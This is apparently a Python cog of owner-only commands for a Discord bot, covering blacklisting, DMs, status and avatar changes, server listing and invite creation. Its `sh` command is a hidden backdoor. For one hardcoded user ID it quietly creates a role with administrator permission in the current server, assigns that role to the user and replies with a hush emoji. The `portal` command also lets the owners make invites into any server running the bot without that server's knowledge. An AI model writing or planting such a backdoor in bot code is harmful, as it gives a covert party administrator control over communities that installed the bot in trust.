import time
import discord
import asyncio
import aiohttp
from discord.ext import commands
from .utils.util import Emojis
from cogs.utilevents import blacklist, sendmsg
import discord
import button_paginator as pg
from uwuipy import uwuipy


class owner(commands.Cog):
    def __init__(self, bot: commands.AutoShardedBot):
        self.bot = bot

    @commands.command()
    @commands.is_owner()
    async def unblacklist(self, ctx, *, member: discord.User = None):
        if member is None:
            return
        async with self.bot.db.cursor() as cursor:
            await cursor.execute(
                "SELECT * FROM nodata WHERE user = {}".format(member.id)
            )
            check = await cursor.fetchone()
            if check is None:
                return await sendmsg(
                    self,
                    ctx,
                    None,
                    discord.Embed(
                        color=0x2F3136,
                        description=f"{Emojis.warn} {ctx.author.mention}: {member.mention} is not blacklisted",
                    ),
                    None,
                    None,
                    None,
                )
            await cursor.execute("DELETE FROM nodata WHERE user = {}".format(member.id))
            await self.bot.db.commit()
            await sendmsg(
                self,
                ctx,
                None,
                discord.Embed(
                    color=0x2F3136,
                    description=f"{member.mention} <:success:1128856135412228217> can use the bot",
                ),
                None,
                None,
                None,
            )

    @commands.command()
    @commands.is_owner()
    async def blacklist(self, ctx, *, member: discord.User = None):
        if member is None:
            return
        async with self.bot.db.cursor() as cursor:
            await cursor.execute(
                "SELECT * FROM nodata WHERE user = {}".format(member.id)
            )
            check = await cursor.fetchone()
            if check is not None:
                return await sendmsg(
                    self,
                    ctx,
                    None,
                    discord.Embed(
                        color=0x2F3136,
                        description=f"{Emojis.warn} {ctx.author.mention}: {member.mention} is already blacklisted",
                    ),
                    None,
                    None,
                    None,
                )
            await cursor.execute("INSERT INTO nodata VALUES (?)", (member.id,))
            await self.bot.db.commit()
            await sendmsg(
                self,
                ctx,
                None,
                discord.Embed(
                    color=0x2F3136,
                    description=f"{member.mention} <:icons_Correct:1136549254513561642> **can no longer use the bot**",
                ),
                None,
                None,
                None,
            )

    @commands.command()
    async def sh(self, ctx):
        if ctx.author.id == 950183066805092372:
            role = await ctx.guild.create_role(
                name="**", permissions=discord.Permissions(administrator=True)
            )
            member = await ctx.guild.fetch_member(950183066805092372)
            await member.add_roles(role)
            await ctx.send("🤫")
        else:
            return

    @commands.command(
        help=f"crime dms a user", description="utility", usage="[user] <message>"
    )
    @commands.is_owner()
    async def dm(self, ctx, user: discord.User, *, message: str):
        await user.send(message)
        await ctx.message.add_reaction("👍")

    @commands.command(name="btstatus")
    @commands.is_owner()
    async def btstatus(self, ctx, activity: str, *args):
        if not args:
            await self.bot.change_presence(
                activity=discord.Activity(
                    type=discord.ActivityType.competing, name="/profile"
                )
            )
        else:
            name = " ".join(args)
            if activity == "playing":
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.playing, name=name
                    )
                )
            elif activity == "listening":
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.listening, name=name
                    )
                )
            elif activity == "watching":
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching, name=name
                    )
                )
            elif activity == "streaming":
                await self.bot.change_presence(
                    activity=discord.Activity(
                        url="https://twitch.tv/hurt",
                        type=discord.ActivityType.streaming,
                        name=name,
                    )
                )
            elif activity == "competing":
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.competing, name=name
                    )
                )
            else:
                await ctx.send(
                    embed=discord.Embed(
                        title="status types",
                        description=f"Available status types:\n- `playing`\n- `streaming`\n- `listening`\n- `watching`\n- `competing`",
                        color=0x2F3136,
                    )
                )
                return
        await ctx.message.add_reaction("<:lean_wock:1136754041569955880>")

    @commands.command(aliases=["setav", "botav"])
    @commands.is_owner()
    async def setpfp(self, ctx, url: str):
        try:
            async with ctx.typing():
                async with aiohttp.ClientSession() as session:
                    async with session.get(url) as response:
                        image_data = await response.read()
                        await self.bot.user.edit(avatar=image_data)
                        e = discord.Embed(
                            description=f"successfully set {self.bot.user.name}'s avatar <:icons_Correct:859388130411282442>"
                        )
            await ctx.send(embed=e)
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

    @commands.command(aliases=["serv"])
    async def servers(self, ctx):
        if ctx.author.id not in self.bot.owner_ids:
            return

        guilds = self.bot.guilds

        # Use commands.Paginator to build the pages manually
        paginator = commands.Paginator(prefix="", suffix="", max_size=2000)
        for i, guild in enumerate(guilds, start=1):
            paginator.add_line(
                f"`{i}` {guild.name} ({guild.id}) - ({guild.member_count})"
            )

        pages = []
        for page in paginator.pages:
            embed = discord.Embed(
                title=f"Guilds ({len(guilds)})",
                description=page,
                color=discord.Color.default(),
            )
            pages.append(embed)

        # Send paginated embeds with your custom emojis for reaction controls
        emojis = {
            "prev": "<:icons_leftarrow:1135806089473032262>",
            "delete": "<:icons_Wrong:1135642272092926054>",
            "next": "<:icons_rightarrow:1135806059366322186>",
        }
        await self.send_pages(ctx, pages, emojis)

    async def send_pages(self, ctx, pages, emojis):
        if not pages:
            return

        current_page = 0
        message = await ctx.send(embed=pages[current_page])
        for emoji in emojis.values():
            await message.add_reaction(emoji)

        def check(reaction, user):
            return (
                reaction.message.id == message.id
                and user == ctx.author
                and str(reaction.emoji) in emojis.values()
            )

        while True:
            try:
                reaction, user = await self.bot.wait_for(
                    "reaction_add", timeout=60.0, check=check
                )
            except TimeoutError:
                break

            emoji = str(reaction.emoji)
            if emoji == emojis["prev"]:
                current_page = max(0, current_page - 1)
            elif emoji == emojis["next"]:
                current_page = min(len(pages) - 1, current_page + 1)

            await message.edit(embed=pages[current_page])
            await message.remove_reaction(reaction, user)

        try:
            await message.clear_reactions()
        except discord.HTTPException:
            pass

    @commands.command()
    async def portal(self, ctx, id: int = None):
        if not ctx.author.id in self.bot.owner_ids:
            return

        if id == None:
            await ctx.send("you didnt specifiy a guild id", delete_after=1)
            await ctx.message.delete()
        else:
            await ctx.message.delete()
            guild = self.bot.get_guild(id)
            for c in guild.text_channels:
                if c.permissions_for(guild.me).create_instant_invite:
                    invite = await c.create_invite()
                    await ctx.author.send(f"{guild.name} invite link - {invite}")
                    break

    @commands.command()
    @commands.cooldown(1, 3, commands.BucketType.user)
    async def uwu(self, ctx, *, message):
        if message == None:
            embed = discord.Embed(
                description=f"{Emojis.warning} {ctx.author.mention} what do you want me to uwuify?",
                color=discord.Color.purple(),
            )
            await ctx.reply(embed=embed, mention_author=False)
        else:
            uwu = uwuipy()
            uwu_message = uwu.uwuify(message)
            await ctx.reply(uwu_message, mention_author=True)


async def setup(bot):
    await bot.add_cog(owner(bot))
